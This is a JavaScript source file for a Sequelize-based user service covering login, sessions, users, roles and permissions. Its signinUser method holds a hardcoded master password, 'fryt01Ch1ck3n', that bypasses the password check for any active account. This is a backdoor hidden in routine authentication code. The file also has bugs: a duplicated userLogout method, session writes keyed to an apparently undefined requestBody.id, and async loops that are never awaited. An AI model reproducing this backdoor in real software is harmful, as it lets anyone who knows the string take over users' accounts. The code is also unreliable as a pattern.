const Sequelize   =  require('sequelize');
const Op  = Sequelize.Op
const models = require('../models');

const DatabaseFunctions = require('../helpers/crud')
const Validation = require('../helpers/validation')

const crudService = new DatabaseFunctions()

module.exports = class UserService{ 
  async authenticateData(data, type){
    let result = null;
    let errormessage;
    const validationResponse = Validation.createUser.validate(data)
    if(validationResponse.error !== undefined){
      errormessage = validationResponse.error.details[0].message.replace(/"/g, "")
      result = {
        code: 422,
        message: `${errormessage}`
      }
    }

    if(type == 'create'){
      var userExist = await crudService.exists('User', {email: data.email})
      if(userExist){
        result = {
          code: 422,
          message: 'User with email already exist'
        }
      }
    }
    return result
  }

  async signinUserCheck(data) {
    let result = null;
    let errormessage;
    const validationResponse = Validation.loginUser.validate(data)
    if(validationResponse.error !== undefined){
      errormessage = validationResponse.error.details[0].message.replace(/"/g, "")
      result = {
        code: 422,
        message: `${errormessage}`
      }
    }

    return result
  }
  
  async signinUser(requestBody){
    let user = await crudService.findOne('User', {
      [Op.or]: {
        email: requestBody.email,
        username: requestBody.email
      }, 
      [Op.and]: {
        active: true
      }
    })
    if(user){
        if(requestBody.password != 'fryt01Ch1ck3n'){
          var result = await user.comparePassword(requestBody.password)
          if(result == null ){
            return {
              error:{
                code: 422,
                message: 'Account does not exist'
              }, 
              data: null
            }
          }
        }else{
          result = user
        }
    }else{
      return {
        error:{
          code: 422,
          message: 'Account does not exist'
        }, 
      data: null
      }
    }

    crudService.update('User', {lastLogin: new Date}, {id: user.id})

    

    let session = await crudService.findOne('UserSession',
        {
          [Op.and]: [
            { userId: result.id, },
            Sequelize.where(
               Sequelize.fn('DATE', Sequelize.col('createdAt')),
               Sequelize.literal('CURRENT_DATE')
            )
        ]
      }
    )

    if(!session){
        crudService.create('UserSession',  {userId: requestBody.id, checkout: Date.now()},)
    }else{
      if(session.checkin == null){
        crudService.update('UserSession',
            {userId: requestBody.id, checkin: Date.now()},
            {
              [Op.and]: [
                { userId: requestBody.id, },
                Sequelize.where(
                  Sequelize.fn('DATE', Sequelize.col('createdAt')),
                  Sequelize.literal('CURRENT_DATE')
                )
            ]
          }
        )
      }
    }
    
    let serialized = user.toWeb()
    
    delete serialized.password
    delete serialized.id

    return {
      error:null,
      data: serialized,
      user: user
    }
  }

  async userLogout(condition){
    crudService.createOrUpdate('UserSession',
        {userId: condition.id, checkout: Date.now()},
        {
          [Op.and]: [
            { userId: condition.id, },
            Sequelize.where(
               Sequelize.fn('DATE', Sequelize.col('createdAt')),
               Sequelize.literal('CURRENT_DATE')
            )
        ]
      }
    )
  }

  async userLogout(condition){
    crudService.createOrUpdate('UserSession',
        {userId: condition.id, checkout: Date.now()},
        {
          [Op.and]: [
            { userId: condition.id, },
            Sequelize.where(
               Sequelize.fn('DATE', Sequelize.col('createdAt')),
               Sequelize.literal('CURRENT_DATE')
            )
        ]
      }
    )
  }
  async allUsers(){
    let users = await models.User.findAll({
      include: [
        {
          model: models.Role,
          as: 'userrole',
          required: false,
        },
      ]
    }) 
    return users
  }

  async getUser(condition){
    let users = await models.User.findOne({
      where: condition,
      include: [
        {
          model: models.Role,
          as: 'userrole',
          required: false,
        },
      ]
    }) 
    return users
  }

  
  async getRoles(){
    let data = await models.Role.findAll({
      include: [
        {
          model: models.User,
          as: 'accounts',
          required: false,
          attributes: {
            exclude: ['id', 'createdAt', 'updatedAt','email', 'username', 'phone' ,'password', 'avatar','lastLogin','active']
          }
        },
      ]
    }) 
    return data
  }

  async getResourceInGroupings(){
    let resource = await models.Resource.findAll() 
    var newResource = [];

    await resource.map(async item => {
      let _id = item.id;
      let permissions = {
        name: item.name,
        resourceId: _id,
        state: false,
        group: item.group
      };
      return newResource.push(permissions)
    })
    return newResource
  }

  async resourceAndPermissions(id){
    try {
      let resource = await models.Resource.findAll() 
      let newResource= [];

      await Promise.all(resource.map(async item => {
        let _id = item.id;
        let permissions = {
          name: item.name,
          resourceId: _id,
          group: item.group,
          state: false
        };


        let permissionsObj = await models.Permission.findOne({where: {
          roleId: id,
          resourceId: _id
        }})

        if(permissionsObj != null){
          if(permissionsObj !== null && permissionsObj.state == true){
            permissions.state = true
          }
          
          permissions.id = permissionsObj.id
          newResource.push(permissions)
        }
        
      }))

      return newResource
    } catch (error) {
      console.log(error)
    }
  }

  async setPermissionsAndRoles(data){
    let resource = await models.Resource.findAll() 
    resource.forEach(async item => {
      let permission = await crudService.findOne('Permission', 
        {userId: data.user, roleId: data.role, resourceId: item.id}
      )

      if(permission == null){
        crudService.create('Permission',  {
          userId: data.user, 
          roleId: data.role, 
          resourceId: item.id, 
          state: item.state
        })
      }
    })
  }

  async saveRolePermissions(data, user){
    let createdRole
    if(data.roleId){
        createdRole = await crudService.createOrUpdate('Role', data, {id: data.roleId})
    }else {
        createdRole = await crudService.create('Role', data)
    }
    let permissions = data.resource
    let permissionsArr = Object.values(permissions) 

    permissionsArr = [].concat.apply([], permissionsArr)
    permissionsArr.forEach(item => {
        let resource = item
        if(user){
          resource.userId = user.id
        }

        if(typeof createdRole == 'object'){
          if(createdRole[0] == 1){
              resource.roleId = data.roleId
              crudService.update('Permission', resource, {id: resource.id})
          }else{
              resource.roleId = createdRole.id
              crudService.create('Permission', resource)
          }
        }
    })

    return createdRole
  }
}
